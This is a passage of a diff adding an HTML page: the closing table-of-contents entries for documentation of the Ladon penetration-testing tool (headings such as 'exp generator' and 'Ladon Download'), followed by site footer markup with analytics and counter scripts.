href="#0x007-MSF-Interactive-CMD"><span class="toc-text">0x007 MSF Interactive CMD</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Advanced-usage"><span class="toc-text">Advanced usage</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x001-exp-generator"><span class="toc-text">0x001 exp generator</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x002-user-defined-module-tutorial"><span class="toc-text">0x002 user defined module tutorial</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x003-plug-in-example-source-code"><span class="toc-text">0x003 plug in example source code</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ladon-Download"><span class="toc-text">Ladon Download</span></a></li></ol>
+        
+    </div>
+</aside>
+                
+            </div>
+        </div>
+    </section>
+    <footer class="main-footer">
+    <div class="container">
+        <div class="row">
+        </div>
+    </div>
+</footer>
+<a id="back-to-top" class="icon-btn hide">
+    <i class="fa fa-chevron-up"></i>
+</a>
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?0f0409af9df7ad2cc43cc334b4d9b515";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+ <script type="text/javascript" src="http://libs.baidu.com/jquery/1.11.1/jquery.min.js"></script>
+ <script src="https://cdn.bootcdn.net/ajax/libs/lazysizes/5.3.2/lazysizes.min.js" async=""></script>
+
+    <div class="copyright">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="busuanzi">
+    
+    Total:
+    <strong id="busuanzi_value_site_pv">
+        <i class="fa fa-spinner fa-spin"></i>
+    </strong>
+	<!-- 
+    &nbsp; | &nbsp;
+    
+	Visitors:
+    <strong id="busuanzi_value_site_uv">
+        <i class="fa fa-spinner fa-spin"></i> 
+    </strong>
+	-->
+    
+</div>
+            </div>
+            <div class="col-sm-12">
+                <span>Copyright ©
+                    2020
+                    
+                </span> |
+                <span>
+                    Powered by <a href="//k8gege.org" class="copyright-links" target="_blank" rel="nofollow">K8gege</a>
+                </span>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<script async="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+<script src="/js/app.js?rev=@@hash.js"></script>
+
+
+</body></html>
